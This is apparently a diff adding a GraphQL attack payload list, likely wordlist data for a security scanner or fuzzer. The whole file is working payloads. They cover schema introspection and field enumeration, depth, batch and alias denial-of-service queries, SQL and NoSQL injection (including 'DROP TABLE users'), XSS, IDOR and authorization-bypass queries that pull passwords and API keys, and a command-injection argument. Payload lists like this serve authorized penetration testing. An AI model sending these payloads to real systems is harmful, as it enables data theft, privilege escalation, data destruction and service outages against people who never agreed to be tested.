@@ -1,0 +1,84 @@
+# Introspection Queries - Schema Discovery
+INTROSPECTION:FULL:{__schema{types{name,fields{name,args{name,type{name,kind}}}}}}
+INTROSPECTION:TYPES:{__schema{types{name,kind,description}}}
+INTROSPECTION:QUERIES:{__schema{queryType{fields{name,description}}}}
+INTROSPECTION:MUTATIONS:{__schema{mutationType{fields{name,description}}}}
+INTROSPECTION:SUBSCRIPTIONS:{__schema{subscriptionType{fields{name}}}}
+INTROSPECTION:DIRECTIVES:{__schema{directives{name,args{name}}}}
+
+# Field Suggestions - Typo-based discovery
+FIELD_SUGGEST:{__typename}
+FIELD_SUGGEST:{user{__typename}}
+FIELD_SUGGEST:{usre{id}}
+FIELD_SUGGEST:{admin{passwrd}}
+
+# Depth-based DoS
+DOS:DEPTH3:query{user{posts{comments{user{posts{comments{id}}}}}}}
+DOS:DEPTH5:query{a:user{b:posts{c:comments{d:user{e:posts{f:comments{g:user{h:posts{i:id}}}}}}}}}
+DOS:DEPTH10:query{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r{s{t{id}}}}}}}}}}}}}}}}}}}}
+
+# Batch Query Abuse
+BATCH:10:[REPEAT:10]{user(id:1){id,name,email}}
+BATCH:50:[REPEAT:50]{user(id:1){id}}
+BATCH:100:[REPEAT:100]{__typename}
+
+# Alias-based DoS
+ALIAS:100:query{[ALIAS:100]user(id:1){id}}
+ALIAS:50:query{[ALIAS:50]users{id,name}}
+
+# SQLi in GraphQL arguments
+SQLI:{user(id:"1' OR '1'='1"){id,name}}
+SQLI:{user(id:"1'; DROP TABLE users--"){id}}
+SQLI:{user(name:"admin' UNION SELECT null,null,null--"){id}}
+SQLI:{users(filter:"' OR 1=1--"){id,password}}
+
+# NoSQLi in GraphQL arguments
+NOSQLI:{user(id:"{$ne:null}"){id}}
+NOSQLI:{user(filter:"{$gt:''}"){password}}
+NOSQLI:{login(username:"admin",password:"{$ne:null}"){token}}
+
+# XSS in GraphQL responses
+XSS:{user(name:"<script>alert(1)</script>"){id}}
+XSS:{createPost(title:"<img src=x onerror=alert(1)>"){id}}
+XSS:{updateUser(bio:"<svg/onload=alert(1)>"){id}}
+
+# IDOR in GraphQL
+IDOR:{user(id:9999){id,email,password,ssn}}
+IDOR:{admin(id:1){id,password,apiKey}}
+IDOR:{privateData(userId:2){secrets}}
+
+# Authorization Bypass
+AUTHZ:{adminPanel{users{id,password}}}
+AUTHZ:{deleteUser(id:1){success}}
+AUTHZ:{promoteToAdmin(userId:2){success}}
+
+# Injection in mutations
+MUTATION:SQLI:mutation{createUser(name:"' OR '1'='1",email:"test@test.com"){id}}
+MUTATION:XSS:mutation{updateProfile(bio:"<script>alert(document.cookie)</script>"){id}}
+MUTATION:CMDI:mutation{runCommand(cmd:"ls; whoami"){output}}
+
+# Directive abuse
+DIRECTIVE:@skip(if:true){user{password}}
+DIRECTIVE:@include(if:false){sensitiveData{secret}}
+DIRECTIVE:@deprecated{legacyEndpoint{apiKey}}
+
+# Fragment-based attacks
+FRAGMENT:fragment userInfo on User{id,password} query{user{...userInfo}}
+FRAGMENT:fragment a on User{...b} fragment b on User{...a} query{user{...a}}
+
+# Type confusion
+TYPE:{user(id:true){id}}
+TYPE:{user(id:[]){id}}
+TYPE:{user(id:{}){id}}
+
+# Circular queries (CPU exhaustion)
+CIRCULAR:query{user{posts{author{posts{author{posts{author{id}}}}}}}}
+
+# Field duplication
+DUPLICATE:query{user{id id id id id password password password}}
+
+# Suggestion/Error-based enumeration
+ENUM:{usr{id}}
+ENUM:{user{passwrd}}
+ENUM:{user{secretToken}}
+ENUM:{admin{apikey}}
